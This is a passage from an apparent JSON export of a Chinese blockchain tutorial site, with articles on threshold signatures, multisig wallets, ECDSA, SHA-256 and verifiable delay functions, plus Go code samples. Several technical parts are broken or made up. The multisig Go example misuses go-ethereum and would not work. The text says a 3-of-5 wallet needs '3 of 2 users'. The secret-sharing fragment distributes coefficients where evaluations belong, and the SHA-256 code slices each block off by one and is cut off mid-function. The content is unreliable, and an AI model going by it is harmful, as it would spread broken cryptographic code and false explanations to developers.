t。如果门限值选择得过小，那么签名系统容易受到攻击；如果门限值选择得过大，那么签名系统的效率将受到影响；\n参与方数量有限制：门限签名方案需要预先确定参与方的数量，并且这个数量必须大于门限值。如果需要新增参与方，那么就需要重新生成签名私钥，从而增加了管理成本；\n需要额外的通信开销：门限签名方案需要在参与方之间进行通信，从而增加了通信的开销。如果参与方数量很大，那么通信开销会非常高。\n\n4. 应用场景\n门限签名方案具有私钥安全性高、抗单点故障、抗篡改等优点，因此在一些特定的应用场景中得到了广泛的应用。以下是几个典型的应用场景：\n\n\n区块链：在区块链中，门限签名方案可以用于多方对交易进行签名，从而提高交易的安全性。在一些区块链系统中，参与方数量非常庞大，因此需要使用门限签名方案来避免私钥泄露和单点故障问题；\n\n\n多方计算：在多方计算中，多个参与方需要协同完成某个计算任务，但是参与方之间不信任彼此。门限签名方案可以用于保护计算结果的完整性，防止任何一方篡改计算结果；\n\n\n多方身份认证：在多方身份认证中，多个参与方需要共同验证某个\n\n\n身份的合法性。门限签名方案可以用于实现去中心化的身份认证，保护用户隐私和安全；\n\n机密信息的分发和管理：在一些机密信息的分发和管理场景中，需要多个参与方共同参与，才能够获取完整的机密信息。门限签名方案可以用于保护机密信息的完整性和安全性，防止机密信息被不法分子窃取。\n\n总的来说，门限签名方案在需要多方共同参与，并且需要保证私钥安全性、抗单点故障和抗篡改等方面具有很好的优势，因此在一些特定的应用场景中得到了广泛的应用。\n5. 总结\n门限签名是一种新型的数字签名方案，它可以实现多方对数据进行签名，保护私钥的安全性和签名结果的完整性，避免单点故障和篡改等问题。与传统的数字签名方案相比，门限签名具有更高的安全性和更好的可扩展性，因此在一些特定的应用场景中得到了广泛的应用。随着区块链、多方计算和身份认证等应用的广泛发展，门限签名技术将在未来得到更加广泛的应用和推广。\n\n\n\n\n将 f(x) 的 n 个系数 f_0,f_1,\\ldots,f_{n-1} 分别发送给 n 个参与方，每个参与方获得一个系数；\n\n\n当任意 t 个参与方聚集在一起时，可以通过拉格朗日插值法计算出 f(0)，从而得到秘密 s\n\n"},"blockchainguide/Public_Chain_Development/Cryptography/签名/多签":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/签名/多签","filePath":"blockchainguide/Public_Chain_Development/Cryptography/签名/多签.md","title":"多签","links":[],"tags":[],"content":"多签是一种特殊类型的加密货币钱包，它需要多个私钥授权才能执行交易。这种钱包可以提供更高的安全性和保护，使得资产管理更为安全。在本文中，我们将深入探讨多签钱包的工作原理、使用场景和实现方法。\n工作原理\n多签钱包通常需要多个用户或实体共同使用他们各自保管的私钥来确认任何一笔交易。例如，在一个3-of-5的多签钱包中，需要至少3个用户中的2个授权才能执行一笔交易。\n多签钱包的安全性建立在私钥分散的基础上。如果只有一个人拥有整个钱包的私钥，那么该钱包就变得非常脆弱，因为如果黑客攻击成功，则可以轻易地窃取所有资产。但是，如果多个人共享这些私钥，那么即使其中一个人被黑客攻击，其余私钥仍然可以保持安全。\n当用户发起某笔交易后，该交易将进入待处理状态，并等待多个用户进行确认。每个用户都需要使用其私钥对该笔交易进行签名。只有在所需数量的用户对该交易进行签名后，该交易才能被执行。\n使用场景\n多签钱包通常用于需要较高安全性的场景，例如以下情况：\n团队管理\n多签钱包可用于团队管理资产，需要所有成员的授权才能执行交易，从而确保资产不会被个人单方面操作。这种方法适用于组织和公司等多人共同拥有和管理资产的情况，可以有效避免某一人对资产进行未经授权的操作。\n高价值资产保管\n多签钱包还可以用于高价值加密货币资产的保管。如果您的加密货币资产价值非常高，那么存储在传统的数字钱包中可能不足以提供足够的安全保障。使用多重签名方式可以更好地保护这些高价值资产。\n实现方法\n实现多签钱包需要您了解一些基本概念和技术：\n公钥、私钥和地址\n公钥、私钥和地址是实现多签钱包所需的三个关键元素。每个私钥都与一个公钥相对应，而每个公钥都与一个地址相对应。私钥用于生成数字签名，公钥则用于验证数字签名的有效性，而地址则是加密货币的接收和发送地址。\n多重签名脚本\n多重签名脚本是一段代码，用于定义多签交易的条件。这种脚本通常会要求满足特定数量的签名才能进行后续操作。例如，在一个3-of-5的多签脚本中，需要至少3个私钥授权才能完成交易。\n原始交易\n原始交易是普通的加密货币交易，但它保持在未签名状态。这些交易包含有关交易双方、交易金额和其他详细信息的数据。\n多重签名交易\n多重签名交易是指在满足多重签名脚本条件下生成的交易。该交易需要多个用户对原始交易进行数字签名，以便执行该笔交易。只有在所需数量的用户对该交易进行签名后，该交易才能被广播到区块链并执行。\n已签名的交易\n已签名的交易是指在满足多重签名脚本条件下，经过多个用户签名并生成并得到广播的交易。通过在区块链上发布这些交易，用户可以轻松地共享资产，并确保资产安全。\n实现示例\n以下是一个基于go-ethereum库的实现示例：\npackage main\n \nimport (\n    &quot;context&quot;\n    &quot;crypto/ecdsa&quot;\n    &quot;fmt&quot;\n    &quot;math/big&quot;\n \n    &quot;github.com/ethereum/go-ethereum/common&quot;\n    &quot;github.com/ethereum/go-ethereum/common/hexutil&quot;\n    &quot;github.com/ethereum/go-ethereum/core/types&quot;\n    &quot;github.com/ethereum/go-ethereum/crypto&quot;\n    &quot;github.com/ethereum/go-ethereum/ethclient&quot;\n)\n \nfunc main() {\n    client, err := ethclient.Dial(&quot;rinkeby.infura.io&quot;)\n    if err != nil {\n        panic(err)\n    }\n \n    privateKey1, err := crypto.HexToECDSA(&quot;YOUR_PRIVATE_KEY_1&quot;)\n    if err != nil {\n        panic(err)\n    }\n \n    privateKey2, err := crypto.HexToECDSA(&quot;YOUR_PRIVATE_KEY_2&quot;)\n    if err != nil {\n        panic(err)\n    }\n \n    privateKey3, err := crypto.HexToECDSA(&quot;YOUR_PRIVATE_KEY_3&quot;)\n    if err != nil {\n        panic(err)\n    }\n \n    fromAddress := common.HexToAddress(&quot;YOUR_FROM_ADDRESS&quot;)\n \n    toAddress := common.HexToAddress(&quot;YOUR_TO_ADDRESS&quot;)\n \n    value := big.NewInt(1000000000000000000)\n \n    // 创建一个包含多个签名条件的多重签名脚本\n    multisigScript := append([]byte{0x52}, privateKey1.PublicKey.X.Bytes()...)\n    multisigScript = append(multisigScript, privateKey1.PublicKey.Y.Bytes()...)\n    multisigScript = append(multisigScript, []byte{0x52}, privateKey2.PublicKey.X.Bytes()...)\n    multisigScript = append(multisigScript, privateKey2.PublicKey.Y.Bytes()...)\n    multisigScript = append(multisigScript, []byte{0x52}, privateKey3.PublicKey.X.Bytes()...)\n    multisigScript = append(multisigScript, privateKey3.PublicKey.Y.Bytes()...)\n    multisigScript = append(multisigScript, []byte{0x53, 0x01, 0x00, 0x51})\n \n    // 创建一个未签名的交易\n    nonce, err := client.PendingNonceAt(context.Background(), fromAddress)\n    if err != nil {\n        panic(err)\n    }\n \n    gasPrice, err := client.SuggestGasPrice(context.Background())\n    if err != nil {\n        panic(err)\n    }\n \n    tx := types.NewTransaction(nonce, toAddress, value, 30000, gasPrice, multisigScript)\n \n    // 对交易进行数字签名\n    signer1 := types.HomesteadSigner{}\n    signature1, err := crypto.Sign(signer1.Hash(tx).Bytes(), privateKey1)\n    if err != nil {\n        panic(err)\n    }\n \n    signer2 := types.HomesteadSigner{}\n    signature2, err := crypto.Sign(signer2.Hash(tx).Bytes(), privateKey2)\n    if err != nil {\n        panic(err)\n    }\n \n    signer3 := types.HomesteadSigner{}\n    signature3, err := crypto.Sign(signer3.Hash(tx).Bytes(), privateKey3)\n    if err != nil {\n        panic(err)\n    }\n \n    // 创建一个已签名的交易\n    signedTx, err := tx.WithSignature(signer1, signature1, signer2, signature2, signer3, signature3)\n    if err != nil {\n        panic(err)\n    }\n \n    // 将交易发送到以太坊网络\n    err = client.SendTransaction(context.Background(), signedTx)\n    if err != nil {\n        panic(err)\n    }\n \n    fmt.Printf(&quot;tx sent: %s&quot;, signedTx.Hash().Hex())\n \n \n}\n结论\n多签钱包提供了更强大、更灵活的资产管理方式，可以在不降低灵活性的前提下获得更高的安全保障。在选择多签钱包时，需要注意其使用场景和要求，并谨慎选择适合自己的实现方法。"},"blockchainguide/Public_Chain_Development/Cryptography/签名/死磕密码学_ECDH算法-1":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/签名/死磕密码学_ECDH算法-1","filePath":"blockchainguide/Public_Chain_Development/Cryptography/签名/死磕密码学_ECDH算法-1.md","title":"死磕密码学_ECDH算法-1","links":[],"tags":[],"content":"\n死磕密码学|ECDH算法\n"},"blockchainguide/Public_Chain_Development/Cryptography/签名/死磕密码学_ECDSA算法-2":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/签名/死磕密码学_ECDSA算法-2","filePath":"blockchainguide/Public_Chain_Development/Cryptography/签名/死磕密码学_ECDSA算法-2.md","title":"死磕密码学_ECDSA算法-2","links":[],"tags":[],"content":"\n死磕密码学|ECDSA算法\n文章资料代码请star github.com/blockchainGuide/\n\n\n生成签名\n假设 Alice 希望对消息m进行签名，所采用的椭圆曲线参数为D=(p,a,b,G,n,h)，对应的密钥对为(k,Q)，其中为公钥Q，k为私钥。\nAlice 将按如下步骤进行签名：\n\n产生一个随机数d，1 \\leq d \\leq n-1.  （签名算法首先生成一个临时私公钥对，该临时密钥对用于计算 r 和 s 值。）\n计算dG=(x_1,y_1)，将x_1化为整数\\overline{x_1}.\n计算r=\\overline{x_1} \\ mod \\  n，若r=0，则转向第1步.     （r 值为临时公钥的坐标 x 值）\n计算 d^{-1} \\ mod \\ n\n计算哈希值H(m)，并将得到的比特串转化为整数 e\n计算s=d^{-1}(e+kr) \\ mod \\ n，若s=0，则转向第1步.\n(r,s)即为 Alice 对消息的签名.\n\n椭圆曲线签名验证\n为验证 Alice 对消息 m 的签名(r,s)，Bob 需要得到 Alice 所用的椭圆曲线参数D=(p,a,b,G,n,h)以及 Alice 的公钥 Q。\n步骤如下：\n\n验证 r 和 s 是区间[1,n-1]上的整数.\n计算H(m)并将其转化为整数 e.\n计算w=s^{-1} \\ mod \\ n\n计算u_1=ew \\ mod \\ n以及u_2=rw \\ mod \\ n\n计算X=(x_1,y_1)=u_1G+u_2Q\n若X=O，则拒绝签名，否则将 X 的x坐标x_1转化为整数，并计\\overline{x_1}算v=\\overline{x_1} \\ mod \\ n\n当且仅当v=r时，签名通过验证.\n\n椭圆曲线签名正确性\n要证明v=r，只需要证明X=dG即可。\n证明步骤：\n令：C=u_1G + u_2Q = u_1G+u_2kG=(u_1+u_2k)G\n将u_1、u_2带入：C=(ew+rwk)G=(e+rk)wG=(e+rk)s^{-1}G\n由s=d^{-1}(e+kr) \\mod  n得出s^{-1}=d(e+kr)^{-1} \\mod n，带入： C=(e+kr)d(d+kr)^{-1}G = dG\n使用案例\nfunc main() {\n\t//生成签名----\n\t//声明明文\n\tmessage := []byte(&quot;hello world&quot;)\n\t//生成私钥\n\tprivateKey, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)\n\t//生成公钥\n\tpub := privateKey.PublicKey\n\t//将明文散列\n\tdigest := sha256.Sum256(message)\n\t//生成签名\n\tr, s, _ := ecdsa.Sign(rand.Reader, privateKey, digest[:])\n\t//设置私钥的参数类型为曲线类型\n\tparam := privateKey.Curve.Params()\n\t//获得私钥byte长度\n\tcurveOrderByteSize := param.P.BitLen() / 8\n\t//获得签名返回值的字节\n\trByte, sByte := r.Bytes(), s.Bytes()\n\t//创建数组\n\tsignature := make([]byte, curveOrderByteSize*2)\n\t//通过数组保存了签名结果的返回值\n\tcopy(signature[curveOrderByteSize-len(rByte):], rByte)\n\tcopy(signature[curveOrderByteSize*2-len(sByte):], sByte)\n \n\t//验证----\n\t//将明文做hash散列，为了验证的内容对比\n\tdigest = sha256.Sum256(message)\n\tcurveOrderByteSize = pub.Curve.Params().P.BitLen() / 8\n\t//创建两个整形对象\n\tr, s = new(big.Int), new(big.Int)\n\t//设置证书值\n\tr.SetBytes(signature[:curveOrderByteSize])\n\ts.SetBytes(signature[curveOrderByteSize:])\n \n\t//验证\n\te := ecdsa.Verify(&amp;pub, digest[:], r, s)\n\tif e == true {\n\t\tfmt.Println(&quot;success&quot;)\n\t} else {\n\t\tfmt.Println(&quot;failed&quot;)\n\t}\n}\n参考\n\nmindcarver.cn\njuejin.cn/post/6844903671411671047\njuejin.cn/post/6844903882343071758\nread.pudn.com/downloads54/sourcecode/windows/188357/ECDSA%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0%E5%8F%8A%E5%85%B6%E5%AE%89%E5%85%A8%E6%80%A7%E5%88%86%E6%9E%90.pdf\nzhuanlan.zhihu.com/p/94852431\n"},"blockchainguide/Public_Chain_Development/Cryptography/签名/死磕密码学_SHA256算法-3":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/签名/死磕密码学_SHA256算法-3","filePath":"blockchainguide/Public_Chain_Development/Cryptography/签名/死磕密码学_SHA256算法-3.md","title":"死磕密码学_SHA256算法-3","links":[],"tags":[],"content":"\n死磕密码学|SHA256算法\n文章资料代码请查看 github.com/blockchainGuide/\n文章有不对的地方，欢迎指正哦，觉得帮到您了，给个小关注，谢谢\n\n\nSHA-256简介\nSHA256是SHA-2下细分出的一种算法。\nSHA-2，名称来自于安全散列算法2（英语：Secure Hash Algorithm 2）的缩写，一种密码散列函数算法标准，由美国国家安全局研发，属于SHA算法之一，是SHA-1的后继者。SHA-2下又可再分为六个不同的算法标准。包括了：SHA-224、SHA-256、SHA-384、SHA-512、SHA-512/224、SHA-512/256。\n这些变体除了生成摘要的长度 、循环运行的次数等一些微小差异外，算法的基本结构是一致的。\n说白了，它就是一个哈希函数。\n哈希函数，又称散列算法，是一种从任何一种数据中创建小的数字“指纹”的方法。散列函数把消息或数据压缩成摘要，使得数据量变小，将数据的格式固定下来。该函数将数据打乱混合，重新创建一个叫做散列值（或哈希值）的指纹。散列值通常用一个短的随机字母和数字组成的字符串来代表。\n对于任意长度的消息，SHA256都会产生一个256bit长的哈希值，称作消息摘要。\n这个摘要相当于是个长度为32个字节的数组，通常用一个长度为64的十六进制字符串来表示\n来看一个例子：\n密码学\n\n这句话，经过哈希函数SHA256后得到的哈希值为：\n96a2193935d2cf4000cc4c499ac940c020b6cbfc161893c3ab8dacdb5ac007ad\n\nSHA-256原理\nSHA256的压缩函数主要对 512 位的消息区块和 256 位的中间哈希值进行操作，本质上，它是一个通过将消息区块为密钥对中间哈希值进行加密的 256 位加密算法。 因此，为了描述SHA256算法，有以下两方面的组件需要描述：\n\nSHA256压缩函数\nSHA256消息处理流程\n\n以下的描述当中所使用到的标记如图：\n\n分别表示以下意思：\n\n按位异或\n按位与\n按位或\n补位\n相加以后对2^32^求余\n右移n位\n循环右移n位\n\n常量初始化\n初始哈希值H^(0)^取自自然数中前面 8 个素数(2,3,5,7,11,13,17,19)的平方根的小数部分, 并且取前面的 32 位.\n下面举个例子:\n\\sqrt{2}小数部分约为0.414213562373095048, 而其中\n\n于是, 质数2的平方根的小数部分取前32位就对应0x6a09e667.\n如此类推, 初始哈希值H^(0)^由以下 8 个 32 位的哈希初值构成:\n\nSHA256算法当中还使用到64个常数, 取自自然数中前面64个素数的立方根的小数部分的前32位, 如果用16进制表示, 则相应的常数序列如下:\n428a2f98 71374491 b5c0fbcf e9b5dba5\n3956c25b 59f111f1 923f82a4 ab1c5ed5\nd807aa98 12835b01 243185be 550c7dc3\n72be5d74 80deb1fe 9bdc06a7 c19bf174\ne49b69c1 efbe4786 0fc19dc6 240ca1cc\n2de92c6f 4a7484aa 5cb0a9dc 76f988da\n983e5152 a831c66d b00327c8 bf597fc7\nc6e00bf3 d5a79147 06ca6351 14292967\n27b70a85 2e1b2138 4d2c6dfc 53380d13\n650a7354 766a0abb 81c2c92e 92722c85\na2bfe8a1 a81a664b c24b8b70 c76c51a3\nd192e819 d6990624 f40e3585 106aa070\n19a4c116 1e376c08 2748774c 34b0bcb5\n391c0cb3 4ed8aa4a 5b9cca4f 682e6ff3\n748f82ee 78a5636f 84c87814 8cc70208\n90befffa a4506ceb bef9a3f7 c67178f2\n\n消息预处理\nSHA256算法中的预处理就是在想要Hash的消息后面补充需要的信息，使整个消息满足指定的结构。\n信息的预处理分为两个步骤：附加填充比特和附加长度\n①：附加填充比特\n在报文末尾进行填充，使报文长度在对 512 取模以后的余数是 448\n填充步骤：先补第一个比特为1，然后都补0，直到长度满足对 512 取模后余数是 448。\n需要注意的是，信息必须进行填充，也就是说，即使长度已经满足对 512 取模后余数是 448，补位也必须要进行，这时要填充 512 个比特。\n因此，填充是至少补一位，最多补 512 位。\n例：以信息“abc”为例显示补位的过程。\na,b,c对应的ASCII码分别是97,98,99\n于是原始信息的二进制编码为：01100001 01100010 01100011\n补位第一步，首先补一个“1” ： 0110000101100010 01100011 1\n补位第二步,补423个“0”：01100001 01100010 01100011 10000000 00000000 … 00000000\n补位完成后的数据如下（为了简介用16进制表示）：\n61626380 00000000 00000000 00000000\n00000000 00000000 00000000 00000000\n00000000 00000000 00000000 00000000\n00000000 00000000\n1234\n\n为什么是448?\n因为在第一步的预处理后，第二步会再附加上一个64bit的数据，用来表示原始报文的长度信息。而448+64=512，正好拼成了一个完整的结构。\n②：附加长度值\n附加长度值就是将原始数据（第一步填充前的消息）的长度信息补到已经进行了填充操作的消息后面。\nwiki百科中给出的原文是：append length of message (before pre-processing), in bits, as 64-bit big-endian integer\nSHA256用一个 64 位的数据来表示原始消息的长度。\n因此，通过SHA256计算的消息长度必须要小于2^64，当然绝大多数情况这足够大了。\n长度信息的编码方式为64-bit big-endian integer\n消息“abc”，3 个字符，占用 24 个bit\n因此，在进行了补长度的操作以后，整个消息就变成下面这样了（16进制格式）\n61626380 00000000 00000000 00000000\n00000000 00000000 00000000 00000000\n00000000 00000000 00000000 00000000\n00000000 00000000 00000000 00000018\n\n逻辑运算\nSHA256算法当中所使用到的6个逻辑函数如下：每个函数都对32位字节进行操纵，并输出32位字节。\n\n计算消息摘要\n哈希计算的算法如下面几张图所示：\n\n\n\n基于Go语言的SHA256代码实现\npackage main\n \nimport (\n\t&quot;encoding/binary&quot;\n)\n \nfunc wikiSha256(message []byte) [32]byte {\n    //初始哈希值\n\th0 := uint32(0x6a09e667)\n\th1 := uint32(0xbb67ae85)\n\th2 := uint32(0x3c6ef372)\n\th3 := uint32(0xa54ff53a)\n\th4 := uint32(0x510e527f)\n\th5 := uint32(0x9b05688c)\n\th6 := uint32(0x1f83d9ab)\n\th7 := uint32(0x5be0cd19)\n    \n    //计算过程当中用到的常数\n\tk := [64]uint32{\n                0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,\n\t\t0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,\n\t\t0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,\n\t\t0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,\n\t\t0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,\n\t\t0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,\n\t\t0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,\n\t\t0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2}\n    \n\tpadded := append(message, 0x80)\n\tif len(padded) % 64 &lt; 56 {\n\t\tsuffix := make([]byte, 56 - (len(padded) % 64))\n\t\tpadded = append(padded, suffix...)\n\t} else {\n\t\tsuffix := make([]byte, 64 + 56 - (len(padded) % 64))\n\t\tpadded = append(padded, suffix...)\n\t}\n\tmsgLen := len(message) * 8\n\tbs := make([]byte, 8)\n\tbinary.BigEndian.PutUint64(bs, uint64(msgLen))\n\tpadded = append(padded, bs...)\n \n\tbroken := [][]byte{};\n    \n\tfor i := 0; i &lt; len(padded) / 64; i++ {\n\t\tbroken = append(broken, padded[i * 64: i * 64 + 63])\n\t}\n    \n    //主循环\n\tfor _, chunk := range broken {\n\t\tw := []uint32{}\n        \n\t\tfor i := 0; i &lt; 16; i++ {\n\t\t\tw = append(w, binary.BigEndian.Uint32(chunk[i * 4:i * 4 + 4]))\n\t\t}\n\t\tw = append(w, make([]uint32, 48)...)\n        \n        //W消息区块处理\n\t\tfor i := 16; i &lt; 64; i++ {\n\t\t\ts0 := rightRotate(w[i - 15], 7) ^ rightRotate(w[i - 15], 18) ^ (w[i - 15] &gt;&gt; 3)\n\t\t\ts1 := rightRotate(w[i - 2], 17) ^ rightRotate(w[i - 2], 19) ^ (w[i - 2] &gt;&gt; 10)\n\t\t\tw[i] = w[i - 16] + s0 + w[i - 7] + s1\n\t\t}\n \n\t\ta := h0\n\t\tb := h1\n\t\tc := h2\n\t\td := h3\n\t\te := h4\n\t\tf := h5\n\t\tg := h6\n\t\th := h7\n        \n        //应用SHA256压缩函数更新a,b,...,h\n\t\tfor i := 0; i &lt; 64; i++ {\n\t\t\tS1 := rightRotate(e, 6) ^ rightRotate(e, 11) ^ rightRotate(e, 25)\n\t\t\tch := (e &amp; f) ^ ((^e) &amp; g)\n\t\t\ttemp1 := h + S1 + ch + k[i] + w[i]\n\t\t\tS0 := rightRotate(a, 2) ^ rightRotate(a, 13) ^ rightRotate(a, 22)\n\t\t\tmaj := (a &amp; b) ^ (a &amp; c) ^ (b &amp; c)\n\t\t\ttemp2 := S0 + maj\n \n\t\t\th = g\n\t\t\tg = f\n\t\t\tf = e\n\t\t\te = d + temp1\n\t\t\td = c\n\t\t\tc = b\n\t\t\tb = a\n\t\t\ta = temp1 + temp2\n\t\t}\n        \n\t\th0 = h0 + a\n\t\th1 = h1 + b\n\t\th2 = h2 + c\n\t\th3 = h3 + d\n\t\th4 = h4 + e\n\t\th5 = h5 + f\n\t\th6 = h6 + g\n\t\th7 = h7 + h\n\t}\n\thashBytes := [][]byte{iToB(h0), iToB(h1), iToB(h2), iToB(h3), iToB(h4), iToB(h5), iToB(h6), iToB(h7)}\n\thash := []byte{}\n\thashArray := [32]byte{}\n\tfor i := 0; i &lt; 8; i ++ {\n\t\thash = append(hash, hashBytes[i]...)\n\t}\n\tcopy(hashArray[:], hash[0:32])\n\treturn hashArray\n}\n \nfunc iToB(i uint32) []byte {\n\tbs := make([]byte, 4)\n\tbinary.BigEndian.PutUint32(bs, i)\n\treturn bs\n}\n \n//循环右移函数\nfunc rightRotate(n uint32, d uint) uint32 {\n\treturn (n &gt;&gt; d) | (n \n代码参考： github.com/blockchainGuide/\n参考\n\nmindcarver.cn\ngithub.com/blockchainGuide/\nwww.iwar.org.uk/comsec/resources/cipher/sha256-384-512.pdf\nlink.zhihu.com/%3A//zh.wikipedia.org/wiki/SHA-2\nzhuanlan.zhihu.com/p/94619052\n"},"blockchainguide/Public_Chain_Development/Cryptography/隐私计算/VDF/VDF":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/隐私计算/VDF/VDF","filePath":"blockchainguide/Public_Chain_Development/Cryptography/隐私计算/VDF/VDF.md","title":"VDF","links":[],"tags":[],"content":"可延迟函数（VDF）研究\n摘要\n本文旨在对可延迟函数（VDF）进行全面的研究。VDF是一种具有可验证输出且固定计算时间的函数。本文将详细介绍VDF的概念、原理、安全性和应用场景。我们还将对现有的VDF构造方法和实现进行评估，并讨论VDF在密码学和分布式系统领域的未来发展趋势。\n目录\n\n引言\nVDF的定义和概念\nVDF的原理\nVDF的安全性\nVDF的构造方法\n\nRSA VDF\n指数VDF\n其他VDF构造方法\n\n\nVDF的实现和优化\nVDF的应用场景\n\n区块链共识算法\n密码学抽奖\n时间戳服务\n其他应用\n\n\nVDF的未来发展趋势\n总结\n\n1. 引言\n可延迟函数（VDF）是一种具有内在延迟性质的密码学函数。与普通函数相比，VDF在计算结果时需要消耗一定的时间，并且这个时间无法通过提高计算资源来缩短。VDF的一个重要特性是其输出具有可验证性，这意味着任何人都可以在较短的时间内验证VDF的计算结果。VDF因其独特的特性而在密码学和分布式系统领域备受关注。\n2. VDF的定义和概念\nVDF是一种函数F，具有以下性质：\n\n固定计算时间：计算F(x)需要消耗一个固定的时间t，这个时间无法通过提高计算资源来缩短。\n唯一性：对于同一输入x，F(x)的输出是唯一的。\n可验证性：给定输入x和输出y，任何人都可以在较短的时间内验证y = F(x)。\n\n3. VDF的原理\nVDF的原理是基于计算难解性假设。VDF利用了一些困难问题（如模指数、离散对数等）的计算难度来实现固定的计算时间。这些问题的解决需要消耗一定的计算资源和时间，而计算过程无法在固定时间内通过并行化或其他优化手段加速。在设计VDF时，需要确保满足唯一性和可验证性的要求。\n4. VDF的安全性\nVDF的安全性取决于其底层的计算难解性假设。为了实现安全的VDF，我们需要选择一个在现有计算技术下难以攻破的困难问题。在评估VDF安全性时，我们需要关注以下几个方面：\n\n攻击者模型：针对不同类型的攻击者，VDF需要提供相应级别的安全性。例如，在面对拥有量子计算资源的攻击者时，VDF可能需要采用量子抗攻击的困难问题。\n攻击方法：需要分析和防范针对VDF的各种攻击方法，如暴力破解、时间回绕攻击等。\n参数选择：VDF的参数选择直接影响其安全性。例如，选择过小的模数可能导致VDF的输出容易被攻击者破解。\n\n5. VDF的构造方法\n目前，已经有多种VDF构造方法被提出。以下是一些主要的VDF构造方法：\n5.1 RSA VDF\nRSA VDF是基于RSA体系的VDF构造方法。它利用了模指数问题的计算难度来实现固定的计算时间。RSA VDF的计算过程涉及大整数模指数运算，而验证过程则利用了RSA模数的特性来加速。\n5.2 指数VDF\n指数VDF是基于离散对数问题的VDF构造方法。它利用了椭圆曲线或有限域上的离散对数问题的计算难度来实现固定的计算时间。指数VDF的计算过程涉及连续的椭圆曲线点加法或有限域乘法运算，而验证过程则利用了配对技术来加速。\n5.3 其他VDF构造方法\n除了上述两种VDF构造方法外，还有一些其他基于不同计算难解性假设的VDF构造方法。这些构造方法可能在某些特定场景下具有优势，如更高的计算效率、更强的安全性等。\n6. VDF的实现和优化\n在实现VDF时，我们需要关注以下几个方面：\n\n\n效率：VDF的计算和验证过程需要尽可能高效。这可能涉及到算法优化、硬件加速等技术。\n\n\n可扩展性：VDF应该能够在大规模系统中使用，支持多个参与者的并行计算和验证。\n\n\n通用性：VDF实现应该能够适应不同场景的需求，包括不同的安全级别、计算资源限制等。\n\n\n兼容性：VDF实现应该尽可能兼容现有的密码学库和硬件设备，以便在实际项目中快速集成。\n\n\n在实现VDF时，可能需要采用多种优化策略，如：\n\n算法优化：通过优化算法来减少计算和验证的时间复杂度。\n并行化：在多核处理器或多个处理器之间分配计算任务，以提高计算效率。\n硬件加速：利用专用硬件设备（如GPU、ASIC等）加速计算和验证过程。\n预计算：在计算VDF时，可以预先计算并存储一些中间结果，以减少实时计算的开销。\n\n7. VDF的应用场景\nVDF因其独特的性质在多个领域具有广泛的应用潜力。以下是一些主要的应用场景：\n7.1 区块链共识算法\n在区块链共识算法中，VDF可以作为一种随机性源来确保选举过程的公平性。例如，在Proof-of-Stake（PoS）共识算法中，VDF可以防止验证者通过提前预测随机数来操纵选举结果。\n7.2 密码学抽奖\nVDF可以应用于密码学抽奖，确保抽奖过程的公平性和不可预测性。通过使用VDF，可以防止参与者在抽奖过程中作弊或预测中奖结果。\n7.3 时间戳服务\nVDF可以用于构建可验证的时间戳服务。通过将时间戳和数据作为VDF的输入，可以生成一个具有可验证性的输出。任何人都可以通过验证VDF输出来确保数据在指定时间之前存在。\n7.4 其他应用\nVDF还可以应用于其他需要随机性和延迟性质的场景，如分布式计算、在线竞赛、加密货币挖矿等。\n8. VDF的未来发展趋势\n随着密码学和分布式系统领域的发展，VDF可能会出现更多的应用场景和新的构造方法。未来的研究可能会关注以下方面：\n\n新的VDF构造方法：基于新的计算难解性假设和密码学技术，可能会出现更高效、更安全的VDF构造方法。\n量子抗攻击VDF：随着量子计算的发展，传统的VDF可能会受到量子攻击的威胁。未来的研究需要探索基于量子抗攻击计算难解性假设的VDF构造方法。\nVDF的可扩展性和并行性：随着大规模系统和多核处理器的普及，提高VDF的可扩展性和并行性将成为一个重要的研究方向。\nVDF与其他密码学原语的结合：VDF可以与其他密码学原语（如零知识证明、同态加密等）结合，实现更丰富的功能和应用场景。\n硬件实现和优化：随着专用硬件设备（如ASIC、FPGA等）的发展，VDF的硬件实现和优化将成为一个有前景的研究领域。\n\n9. 总结\n本文对可延迟函数（VDF）进行了全面的研究。我们介绍了VDF的概念、原理、安全性和应用场景，并对现有的VDF构造方法和实现进行了评估。最后，我们讨论了VDF在密码学和分布式系统领域的未来发展趋势。随着VDF技术的进一步发展，我们期待它在更多场景中发挥重要作用，为构建更安全、更公平的分布式系统提供支持。\n"},"blockchainguide/Public_Chain_Development/Cryptography/隐私计算/VRF/VRF详解":{"slug":"blockchainguide/Public_Chain_Development/Cryptography/隐私计算/VRF/VRF详解","filePath":"blockchainguide/Public_Chain_Development/Cryptography/隐私计算/VRF/VRF详解.md","title":"VRF详解","links":[],"tags":[],"content":"可验证随机函数（VRF）研究\n\n本文研究了可验证随机函数（Verifiable Random Functions，简称VRF）的原理、实现和应用场景。VRF是一种密码学概念，将密码学签名和伪随机函数相结合，提供了一种可验证的随机性。\n\n关键词： 